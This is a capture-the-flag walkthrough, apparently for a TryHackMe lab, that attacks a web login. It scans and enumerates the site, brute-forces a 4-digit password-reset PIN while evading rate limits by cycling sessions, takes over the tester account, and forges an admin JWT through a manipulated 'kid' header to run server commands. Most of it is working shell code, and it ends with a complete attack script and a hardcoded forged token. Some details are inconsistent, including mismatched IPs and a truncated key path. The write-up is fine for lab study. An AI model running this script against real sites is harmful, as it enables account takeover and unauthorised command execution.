# Authentication Attack Example

## 1. Perform Nmap Scan
An nmap scan of the target will discover the open port of a webserver of 1337.

```sh
nmap -sS -Pn -p- -T5 11.11.11.11 -oA scan.results
```

## 2. Visit webpage
Save a copy of the website. 
```sh
curl -S -l http://11.11.11.11:1337 > home.html
```

Inspecting the contents allow us to notice a pattern in the internal url structure:
```html
<img src="/xx_imgs/lizard.jpg">
<a href="/xx_pages/about.html">
<script src="/xx_js/login.js">
```

## 3. Directory Enumeration
Using the information above i'll create a custom wordlist to enumerate and discover hidden directories. I'm certain there is a tool for this, or a better way, but this is quick and dirty.

wordlist.sh
```sh
prefix='xx_'
input_list='Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
output_list='directory-list.txt'
while IFS="" read -r line
do
    echo "$prefix$line" >> $output_list
done < $input_list
```

Reference the list in gobuster and find the hidden directories
```sh
gobuster dir -u http://11.11.11.11:1337 -w directory-list.txt
```

## 4. Explore the hidden directories
The scan uncovered the `xx_logs` dir. Calling it will reveal an exposed `error.log` file.
```sh
curl http://11.11.11.11:1337/xx_logs/

curl http://11.11.11.11:1337/xx_logs/error.log -O
```

## 5. Investigate error.log
The error log file provides some clues to the directory structure and an email address.

| Intel | Notes | Accessible |
| ----- | ----- | ---------- |
| /restricted-area | tester@domain.com | False |
| /admin-login | denies tester account | False |
| /home/dev/test.php | Testing endpoint | False |
| .php | PHP is the language of choice | False |
| /var/www/html/protected | Interesting page | False | 
| /var/www/html/locked-down | Interesting page | False |
| /etc/shadow | Public? | False
| "exceeded limit of 10 internal requests" | DoS | False |

## 6. Test the login form
Now that i've recoverd an email, or at the very least identified their account naming conventions I can attack the login form.

Test for errors by throwing in odd characters.

| Test | Error |
| ---- | ----- |
| tester@domain.com' | None |
| tester@domain.com" | None |
| tester@domain.com OR 1=1-- | None |

No low hanging fruit. Moving on to `/reset_password`

## 7. Investigate the password reset function
Retrieve the page and inspect it.
```sh
curl http://11.11.11.11:1337/reset-password.php
```

This uncovers some interesting looking javascript. I've only included the relevant parts:
```js
let countdown =;
let interval = setInterval(() => {
    countdown--;
    if (countdown <= 0) {
        clearInterval(interval);
        window.location.href = 'logout.php'
    }
}, 1000)
timer.textContent = "You have " + countdown + " seconds left to enter your code";
```

This code will run every 1 second to reduce the value of the `countdown` variable. This is client side so we could change it if needed.

### Summary
- 2 minutes to enter code
- 4 digit code
- There are no preceived limits or protections on this form (Brute force it is)
- Redirects to logout page

## 8. Brute force password reset

### 8.1 Create a 4 digit passwordlist
Using `crunch` we'll build a custom wordlist for all the 4 digit pin possibilities. 
```sh
crunch 4 4 0123456789 -o pins.txt
```

### 8.2 Attack script
Create a script that will try each pin and evaluate the result. 

Submit the initial reset request and save the session to view the pin entry form:
```sh 
curl -sL http://11.11.11.11:1337/reset-password.php -d "email=tester@hammer.thm" --cookie-jar cookie.txt
```

Send a request to the pin form with any combination of numbers
```sh
curl -sL http://11.11.11.11:1337/reset-password.php -d "code=0000" --cookie cookie.txt -O 
```

Identify successful / invalid responses:
```sh
response=$(curl -sL $url -d "code=$code" --cookie cookiet.txt)
if [[ $response == *"Invalid"* ]]; then
    echo "Invalid code"
elif [[ $response == *"Time"* ]]; then
    echo "Timer exceeded"
else
    echo $code
fi
```

### 8.3 Rate Limit Evaison
Running our code in a loop gets us banned. This particular application does have rate limiting protections.
- Limited to 9 requests < minute
- Limit is not visible in the javascript
- Session based?

A delay would significantly increase our brute force time. I'll try a cookie based reset first.
- reset the session if you hit any limits
- send a password reset on success
- save to result.html

```sh
function attempt_pin()
{
        pin=$1
        response=$(curl -sL $reset -d "recovery_code=$pin" --cookie cookie.txt --cookie-jar cookie.txt)
        if [[ $response == *"Invalid"* ]]; then
                echo "Invalid code: $pin"
        elif [[ $response == *"Time"* ]]; then
                echo "Time expired"
				get_session
				continue
        elif [[ $response == *"Rate"* ]]; then
                echo "Rate limit hit: $pin"
                echo "trying new cookies..."
                get_session
                echo "Retrying pin..."
                attempt_pin $pin
        else
                echo "SUCCESS:" $pin
                response=$(curl -sL $reset -d "new_password=$pass" -d "confirm_password=$pass" --cookie cookie.txt --cookie-jar cookie.txt)
                echo $response > result.html
                exit
        fi
}
```

### 9. Login with reset credentials
Now we've reset the user's password. We'll login to it using the code below:
- login
- scrape the token
- send a command

```sh
function login()
{
	curl -sL $url -d "email=$email" -d "password=$pass" --cookie cookie.txt --cookie-jar cookie.txt -o result.html
	token=$(grep -Eo "jwtToken = '(.*)';" result.html | awk -F\' '{print $2}')
	send_ls $token
}
```
### 10. Send ls
Check to see what commands you can run. 

```sh
function send_ls()
{
	token=$2
	curl -sL $x -d '{"command": "ls"}' -H 'Content-Type: application/json' -H "Authorization: Bearer $token" --cookie-jar cookie.txt --cookie cookie.txt
}
```

We can see that someone accidently uploaded a key to the web root. We'll download this the file and view it.
```sh
wget http://10.10.10.10/jwt.key

cat jwt.key
```
### 10. Modify the token
- Copy the jwt from the web page and insert it into [jwt.io]('https://jwt.io'). 
- Near the bottom under verify signature paste the contents of the `jwt.key`. 
- Change the role to `role: admin`
- Change the kid to the file `/var/www/html/jwt.key`

If you are having problems here make sure you clear the default text in that field before pasting the key. It doesn't happen automatically. 

```json
"kid": "/var/www/html/188,
"role": "admin"
```

### Full code:
```sh
#!/usr/bin/env bash

ip='10.10.195.125'
url="http://$ip:1337"

reset="$url/reset_password.php"
log_out="$url/log_out.php"
x="$url/execute_command.php"

email='tester@hammer.thm'
pass='test'

function get_session()
{
        curl -sL $log_out --cookie-jar cookie.txt -O
        curl -sL $reset --cookie-jar cookie.txt -O
        curl -sL $reset -d "email=$email" --cookie-jar cookie.txt -O
}

function attempt_pin()
{
        pin=$1
        response=$(curl -sL $reset -d "recovery_code=$pin" --cookie cookie.txt --cookie-jar cookie.txt)
        if [[ $response == *"Invalid"* ]]; then
                echo "Invalid code: $pin"
        elif [[ $response == *"Time"* ]]; then
                echo "Time expired"
		get_session
		continue
        elif [[ $response == *"Rate"* ]]; then
                echo "Rate limit hit: $pin"
                echo "trying new cookies..."
                get_session
                echo "Retrying pin..."
                attempt_pin $pin
        else
                echo "SUCCESS:" $pin
                response=$(curl -sL $reset -d "new_password=$pass" -d "confirm_password=$pass" --cookie cookie.txt --cookie-jar cookie.txt)
                echo $response > result.html
                exit
        fi
}

function attack()
{
    while IFS="" read -r pin
    do
        attempt_pin $pin
    done < pins.txt
}

function login()
{
	curl -sL $url -d "email=$email" -d "password=$pass" --cookie cookie.txt --cookie-jar cookie.txt -o result.html
	token=$(grep -Eo "jwtToken = '(.*)';" result.html | awk -F\' '{print $2}')
	send_ls $token
}

function send_ls()
{
	token=$2
	curl -sL $x -d '{"command": "ls"}' -H 'Content-Type: application/json' -H "Authorization: Bearer $token" --cookie-jar cookie.txt --cookie cookie.txt
}

function get_flag()
{
	login
	token='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM0NjU2ODI3LCJleHAiOjE3MzQ2NjA0MjcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.N1Jc0l41yo66trQRgZASR3Lu2I2RtHiqqSNCQVAAXXk'
	curl -sL $x -d '{"command": "cat /home/ubuntu/flag.txt"}' -H 'Content-Type: application/json' -H "Authorization: Bearer $token" --cookie-jar cookie.txt --cookie cookie.txt
}

function setup()
{
    crunch 4 4 0123456789 -o pins.txt
    get_session
}
#setup
#attack
get_flag
```
